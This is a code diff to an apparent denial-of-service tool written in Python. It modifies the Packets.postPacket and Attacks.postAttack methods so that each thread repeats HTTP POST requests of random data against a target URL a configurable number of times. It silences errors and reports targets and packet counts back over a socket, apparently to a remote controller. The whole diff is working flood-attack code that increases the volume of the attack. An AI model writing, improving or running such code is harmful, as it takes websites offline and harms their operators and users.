@@ -33,10 +33,11 @@ class Packets:
     finally:
       s.close()
   
-  def postPacket(self, url: str, data: str) -> None:
+  def postPacket(self, url: str, data: str, mult: int) -> None:
     try:
       url = f"{url}"
-      post(url=url, data=data.encode("utf-8"))
+      for _ in range(mult):
+        post(url=url, data=data.encode("utf-8"))
     except Exception as e:
       pass #print(f"Fail: {e}")
 
@@ -104,14 +105,14 @@ class Attacks:
     finally:
       client.send("Stopped".encode("utf-8"))
   
-  def postAttack(self, blacklisted: bool, client: socket, url: str, packets:int, senddelay: int, size: int, threads: int) -> None:
+  def postAttack(self, blacklisted: bool, client: socket, url: str, packets: int, repack: int, senddelay: int, size: int, threads: int) -> None:
     try:
       for x in range(packets):
         client.send(f"{CLEAR}\n".encode("utf-8"))
         for y in range(threads):
           try:
             if not blacklisted:
-              Thread(target=self.packets.postPacket, args=(url, '\n'.join([str(value) for value in nrand.rand(size)]))).start()
+              Thread(target=self.packets.postPacket, args=(url, '\n'.join([str(value) for value in nrand.rand(size)]), repack)).start()
               attack: list[str, str, str] = [str(url), str(x+1), str(y+1)]
               try:
                 client.send(f"Target: {attack[0]} : Packets: {attack[1]} : Threads {attack[2]}\nPacket Size: {size}".encode("utf-8"))
